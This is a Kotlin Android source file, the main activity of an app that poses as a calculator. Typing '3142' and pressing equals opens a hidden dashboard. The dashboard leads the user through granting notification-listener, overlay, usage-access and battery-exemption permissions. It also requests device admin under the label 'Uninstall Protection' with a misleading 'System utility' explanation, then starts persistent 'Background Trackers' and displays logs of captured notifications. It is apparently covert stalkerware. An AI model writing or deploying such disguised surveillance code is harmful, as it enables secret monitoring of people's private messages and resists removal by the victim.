package com.android.mycalculator

import android.Manifest
import android.app.AlarmManager
import android.app.AppOpsManager
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    private lateinit var dbHelper: DatabaseHelper
    private lateinit var logTextView: TextView
    private lateinit var calculatorLayout: LinearLayout
    private lateinit var mainContentLayout: ScrollView
    
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    // Dashboard Buttons
    private lateinit var btnPermNotif: Button
    private lateinit var btnPermOverlay: Button
    private lateinit var btnPermWrite: Button
    private lateinit var btnPermDND: Button
    private lateinit var btnPermUsage: Button
    private lateinit var btnPermBattery: Button
    private lateinit var btnPermAlarm: Button
    private lateinit var btnPermPost: Button
    private lateinit var btnAdmin: Button
    private lateinit var btnStartServices: Button

    // Calculator Variables
    private lateinit var display: TextView
    private var isCalculated = false
    private var lastResult = ""

    private val logUpdateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            refreshLogs()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dbHelper = DatabaseHelper(this)
        calculatorLayout = findViewById(R.id.calculatorLayout)
        mainContentLayout = findViewById(R.id.mainContentLayout)
        
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, AdminReceiver::class.java)

        setupCalculator()
        setupDashboard()
        
        val filter = IntentFilter("com.android.mycalculator.NEW_NOTIFICATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(logUpdateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(logUpdateReceiver, filter)
        }
    }

    override fun onResume() {
        super.onResume()
        // Every time the user comes back to the app from Settings, refresh the ✅ and ❌
        if (mainContentLayout.visibility == View.VISIBLE) {
            updateDashboardUI()
        }
    }

    private fun setupCalculator() {
        display = findViewById(R.id.calcDisplay)
        display.movementMethod = android.text.method.ScrollingMovementMethod()

        val typeButtons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9, 
            R.id.btnDot, R.id.btnOpenBracket, R.id.btnCloseBracket, R.id.btnPercent
        )
        
        for (id in typeButtons) {
            findViewById<Button>(id).setOnClickListener {
                val b = it as Button
                if (isCalculated) {
                    display.text = ""
                    isCalculated = false
                }
                if (display.text.toString() == "0" && b.text != ".") display.text = ""
                display.append(b.text)
            }
        }

        val operatorButtons = listOf(R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv)
        for (id in operatorButtons) {
            findViewById<Button>(id).setOnClickListener {
                val b = it as Button
                if (isCalculated) {
                    display.text = lastResult
                    isCalculated = false
                }
                if (display.text.toString() == "0" && b.text == "-") {
                    display.text = "-"
                } else {
                    display.append(b.text)
                }
            }
        }

        findViewById<Button>(R.id.btnC).setOnClickListener {
            display.text = "0"
            isCalculated = false
            lastResult = ""
        }

        findViewById<Button>(R.id.btnDel).setOnClickListener {
            if (isCalculated) {
                display.text = "0"
                isCalculated = false
                return@setOnClickListener
            }
            val text = display.text.toString()
            if (text.length > 1) display.text = text.dropLast(1) else display.text = "0"
        }

        findViewById<Button>(R.id.btnEquals).setOnClickListener {
            val text = display.text.toString()

            // SECRET TRIGGER: Passcode "3142"
            if (text == "3142") {
                calculatorLayout.visibility = View.GONE
                mainContentLayout.visibility = View.VISIBLE
                updateDashboardUI()
                refreshLogs()
                return@setOnClickListener
            }

            if (isCalculated || text.isEmpty() || text == "0") return@setOnClickListener

            try {
                val result = CalculatorService.evaluate(text)
                val resultText = if (result % 1.0 == 0.0) result.toLong().toString() 
                                 else String.format("%.6f", result).trimEnd('0').trimEnd('.')
                
                lastResult = resultText
                display.text = "$text\n= $resultText" 
                isCalculated = true
            } catch (e: Exception) {
                display.text = "Error"
                isCalculated = true
            }
        }
    }

    private fun setupDashboard() {
        logTextView = findViewById(R.id.logTextView)
        btnPermNotif = findViewById(R.id.btnPermNotif)
        btnPermOverlay = findViewById(R.id.btnPermOverlay)
        btnPermWrite = findViewById(R.id.btnPermWrite)
        btnPermDND = findViewById(R.id.btnPermDND)
        btnPermUsage = findViewById(R.id.btnPermUsage)
        btnPermBattery = findViewById(R.id.btnPermBattery)
        btnPermAlarm = findViewById(R.id.btnPermAlarm)
        btnPermPost = findViewById(R.id.btnPermPost)
        btnAdmin = findViewById(R.id.btnAdmin)
        btnStartServices = findViewById(R.id.btnStartServices)

        // CLICK LISTENERS TO OPEN SPECIFIC SETTINGS
        btnPermNotif.setOnClickListener { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
        
        btnPermOverlay.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            }
        }
        
        btnPermWrite.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:$packageName")))
            }
        }

        btnPermDND.setOnClickListener { startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) }
        btnPermUsage.setOnClickListener { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
        
        btnPermBattery.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
            }
        }

        btnPermAlarm.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM, Uri.parse("package:$packageName")))
            }
        }

        btnPermPost.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1001)
            }
        }

        btnAdmin.setOnClickListener {
            if (!dpm.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System utility requires active state.")
                }
                startActivity(intent)
            } else {
                dpm.removeActiveAdmin(adminComponent)
                updateDashboardUI()
                Toast.makeText(this, "Protection disabled.", Toast.LENGTH_SHORT).show()
            }
        }

        btnStartServices.setOnClickListener {
            startAllServices()
            Toast.makeText(this, "Background Trackers Started!", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnRefresh).setOnClickListener { refreshLogs() }
        findViewById<Button>(R.id.btnClear).setOnClickListener {
            dbHelper.writableDatabase.execSQL("DELETE FROM logs")
            refreshLogs()
            Toast.makeText(this, "Local logs cleared!", Toast.LENGTH_SHORT).show()
        }
    }

    // THE BRAINS OF THE DASHBOARD - Checks statuses and updates UI dynamically
    private fun updateDashboardUI() {
        val colorRed = getColorStateList(android.R.color.holo_red_dark)
        val colorGreen = getColorStateList(android.R.color.holo_green_dark)

        // 1. Notification Listener
        val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
        updateBtn(btnPermNotif, notifEnabled, "Notification Access")

        // 2. Overlay
        val overlayEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
        updateBtn(btnPermOverlay, overlayEnabled, "Display Over Other Apps")

        // 3. Write Settings
        val writeEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true
        updateBtn(btnPermWrite, writeEnabled, "Modify System Settings")

        // 4. Do Not Disturb
        val dndEnabled = (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).isNotificationPolicyAccessGranted
        updateBtn(btnPermDND, dndEnabled, "Do Not Disturb Access")

        // 5. Usage Access
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        }
        updateBtn(btnPermUsage, mode == AppOpsManager.MODE_ALLOWED, "Usage Data Access")

        // 6. Battery
        val batteryEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            (getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
        } else true
        updateBtn(btnPermBattery, batteryEnabled, "Ignore Battery Optimization")

        // 7. Alarms
        val alarmEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            (getSystemService(Context.ALARM_SERVICE) as AlarmManager).canScheduleExactAlarms()
        } else true
        updateBtn(btnPermAlarm, alarmEnabled, "Exact Alarms")

        // 8. Post Notifications
        val postEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else true
        updateBtn(btnPermPost, postEnabled, "Post Notifications (A13+)")

        // 9. Admin Protection
        updateBtn(btnAdmin, dpm.isAdminActive(adminComponent), "Uninstall Protection")
    }

    private fun updateBtn(btn: Button, isGranted: Boolean, text: String) {
        if (isGranted) {
            btn.text = "✅ $text"
            btn.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
        } else {
            btn.text = "❌ $text"
            btn.backgroundTintList = getColorStateList(android.R.color.holo_red_dark)
        }
    }

    private fun startAllServices() {
        startService(Intent(this, NotificationService::class.java))
        startService(Intent(this, KeepAliveService::class.java))
        startService(Intent(this, HeartbeatService::class.java))
        AlarmScheduler.scheduleAlarms(this)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
            val job = android.app.job.JobInfo.Builder(1005, ComponentName(this, BackupJobService::class.java))
                .setPeriodic(60 * 60 * 1000)
                .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
                .setRequiresDeviceIdle(false)
                .setRequiresCharging(false)
                .setPersisted(true)
                .build()
            jobScheduler.schedule(job)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(logUpdateReceiver)
    }

    private fun refreshLogs() {
        val logs = dbHelper.getAllLogs()
        logTextView.text = if (logs.isNotEmpty()) logs else "Waiting for notifications..."
    }
}
